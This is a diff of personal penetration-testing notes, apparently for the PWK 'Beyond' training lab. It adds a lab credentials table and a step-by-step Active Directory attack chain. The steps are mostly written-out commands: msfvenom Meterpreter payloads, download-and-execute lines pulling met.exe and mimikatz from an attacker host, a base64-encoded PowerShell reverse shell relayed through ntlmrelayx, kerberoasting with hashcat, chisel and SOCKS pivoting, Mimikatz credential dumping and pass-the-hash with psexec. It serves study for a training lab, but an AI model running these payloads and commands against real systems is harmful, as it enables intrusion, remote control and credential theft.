@@ -2629,29 +2629,31 @@ AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`
 ### 26. Attacking AWS cloud infrastruture 
 
 ### 27. Assembling the pieces  
-```
-#creds.txt
-daniela:tequieromucho (SSH private key passphrase)
-wordpress:DanielKeyboard3311 (WordPress database connection settings)
-john:dqsTwTpZPn#nL (fetch_current.sh)
+| Machine                  | IP              | User / Credentials                            | Attack vector                     |
+|--------------------------|-----------------|-----------------------------------------------|-----------------------------------|
+| WEB (EXTERNAL)           | 192.168.178.244 | daniela (id_rsa:tequieromucho)                | Web server                        |
+| MAIL(EXTERNAL)           | 192.168.178.242 | john:dqsTwTpZPn#nL                            | External mail access              |
+| DC                       | 172.16.134.240  | Beccy:NiftyTopekaDevolve6655!#!               | Domain Controller                 |
+| INTERNAL(wordpress)      | 172.16.134.241  | daniela:DANIelaRO123                          | Internal web server / WordPress   |
+| –                        | 172.16.134.242  | –                                             | Unassigned                        |
+| CLIENT                   | 172.16.134.243  | marcus                                        | Workstation                       |
+| MAIL(INTERNAL)           | 172.16.134.254  | Beccy, Administrator, NT AUTHORITY\SYSTEM     | Internal mail / full admin access |
 
-#usernames.txt
-marcus
-john
-daniela
+**Attack vector**
+1. Wordpress scan on WEB  --> Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read  
+2. Arbitrary File Read /etc/passwd --> discover users daniela, marcus  
+3. Arbitrary File Read /home/daniela/.ssh/id_rsa --> crack the passphrase --> tequieromucho  
+4. **Landed daniela@WEB**  
+5. Abuse git sudo --> elevated privileges to root  
+6. Examined the Git history --> discover credential **john:dqsTwTpZPn#nL** for /srv/www/wordpress  
+7. Phishing attack (sent from john) on other user danielam marcus --> **reverse sehell obtained on machine CLIENT as the domain user beyond\marcus**  
+8. Analyzing sharpfound results --> kerberoastable users: krbtgt, daniela. Domain admins members: beccy, adminsitrator  
+9. Get a meterpreter shell on CLIENT --> create a SOCK5 proxy to access the internal network
+10. Port scan 172.16.136.241 (INTERNAL), 172.16.134.254 (MAIL) --> A web app is running, SMB Signing was disabled on MAIL & INTERNAL
+11. Attempt kerberoasting --> Found credential **daniela:DANIelaRO123**
+12. Login to **wordpress 172.16.134.241**. Found plugin backup path to update --> ntlmrelayx attack MAIL --> **reverse sehell obtained on machine MAIL as administrator**
+13. **Dump NTLM hash for beccy** (domain administrator) --> get an interactive shell on DC
 
-#passwords.txt
-tequieromucho
-DanielKeyboard3311
-dqsTwTpZPn#nL
-
-#local enumeration
-Operative system: Ubuntu 22.04.01 LTS
-Interfaces: 192.168.50.244/24
-
-Lateral movement
-WEBSRV1 (gained access)
-```
 - Enumerating the **public network**
   - Nmap scan of MAILSRV1  
     `kali@kali:~/beyond$ sudo nmap -sC -sV -oN mailsrv1/nmap 192.168.50.242` #hMailServer smtpd, Microsoft Windows RPC, Microsoft IIS httpd 10.0
@@ -2833,11 +2835,96 @@ WEBSRV1 (gained access)
       RETURN p
       ```
     - List all Kerberoastable Accounts pre-built query in BloodHound
-      `MATCH (n:User {hasspn:true}) RETURN n`
-    - 
-  - dddd
+      `MATCH (n:User {hasspn:true}) RETURN n` #daniela, krbtgt
+    - List domain admins members: beccy, administrator
+  - Creating a Meterpreter reverse shell executable file
+    `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.189 LPORT=443 -f exe -o met.exe`
+  - Starting Metasploit listener on port 443
+    ```
+    kali@kali:~/beyond$ sudo msfconsole -q
+	msf6 > use multi/handler
+	msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+	msf6 exploit(multi/handler) > set LHOST 192.168.45.189
+	msf6 exploit(multi/handler) > set LPORT 443
+	msf6 exploit(multi/handler) > set ExitOnSession false
+	msf6 exploit(multi/handler) > run -j
+    ```
+  - Downloading and executing Meterpreter reverse shell > Incoming session in Metasploit
+    ```
+    PS C:\Users\marcus> iwr -uri http://192.168.45.189:8000/met.exe -Outfile met.exe
+	PS C:\Users\marcus> .\met.exe
+    ```
+  - Creating a SOCKS5 proxy to access the internal network from our Kali machine
+    ```
+    msf6 exploit(multi/handler) > use multi/manage/autoroute
+	msf6 post(multi/manage/autoroute) > set session 1
+	msf6 post(multi/manage/autoroute) > run
+	msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
+	msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
+	msf6 auxiliary(server/socks_proxy) > set VERSION 5
+	msf6 auxiliary(server/socks_proxy) > run -j
+    ```
+  - proxychains configuration file settings (socks5 127.0.0.1 1080)
+  - Enumerating SMB with CrackMapExec and proxychains  
+    `kali@kali:~/beyond$ proxychains -q crackmapexec smb 172.16.134.240-241 172.16.134.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares`
+  - Using Nmap to perform a port scan on ports 21, 80, and 443
+    `kali@kali:~/beyond$ sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 172.16.134.240 172.16.134.241 172.16.134.254`
+  - Setting up Chisel on Kali to access the Web Server on INTERNALSRV1 via Browser
+    `kali@kali:~/beyond$ ./chisel server -p 8080 --reverse`  
+  - Uploading Chisel to CLIENTWK1 via our Meterpreter session
+    ```
+    msf6 auxiliary(server/socks_proxy) > sessions -i 1
+    meterpreter > upload chisel.exe C:\\Users\\marcus\\chisel.exe
+    ```
+  - Utilizing Chisel to set up a reverse port forwarding to port 80 on INTERNALSRV1
+    `C:\Users\marcus> .\chisel.exe client 192.168.45.189:8080 `
+  - Browse localhost but failed redirect > edit etc/hosts (127.0.0.1 internalsrv1.beyond.com)
+  - open /wp-admin  
 - Attack an internal **web application**
-- Gaining access to the **Domain controller**
+  - Kerberoasting the daniela user account
+    `kali@kali:~/beyond$ proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.134.240 beyond.com/john`  
+  - Cracking the TGS-REP hash
+    `kali@kali:~/beyond$ sudo hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force`  
+  - Abuse a WordPress Plugin for a Relay Attack  
+   - Setting up impacket-ntlmrelayx
+     ```
+     $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.189",9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+	 $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+	 $EncodedText =[Convert]::ToBase64String($Bytes)
+	 $EncodedText
+
+     kali@kali:~/beyond$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.178.242 -c "powershell -enc JABjAGwAaQ..."
+     ```
+   - Setting up Netcat listener on port 9999
+   - Modified Backup directory path //192.168.45.189 save
+   - Incoming reverse shell (nt authority\system, hostname: MAILSRV1)
+- Gaining Access to the Domain Controller
+  - Downloading and executing the Meterpreter reverse shell
+    ```
+    PS C:\Windows\system32> cd C:\Users\Administrator
+	PS C:\Users\Administrator> iwr -uri http://192.168.45.189:8000/met.exe -Outfile met.exe
+	PS C:\Users\Administrator> .\met.exe
+    ```
+  - Incoming Meterpreter session in Metasploit (session 2)  
+  - Interacting with Session 2 and spawning a PowerShell command shell
+    ```
+    msf6 post(multi/manage/autoroute) > sessions -i 2
+	meterpreter > shell
+	C:\Users\Administrator> powershell
+    ```
+  - Downloading and launching the newest version of Mimikatz from our Kali machine
+    ```
+    PS C:\Users\Administrator> iwr -uri http://192.168.45.189:8000/mimikatz.exe -Outfile mimikatz.exe
+    PS C:\Users\Administrator> .\mimikatz.exe
+    ```
+  - Extracting the credentials for beccy with Mimikatz
+    ```
+    mimikatz # privilege::debug
+	mimikatz # sekurlsa::logonpasswords  #f0397ec5af49971f6efbdb07877046b3
+    ```
+  - Using psexec to get an interactive shell
+    `kali@kali:~$ proxychains -q impacket-psexec -hashes :f0397ec5af49971f6efbdb07877046b3 beccy@172.16.134.240`  
 
 ## PWK-200 labs
 ### Information gathering
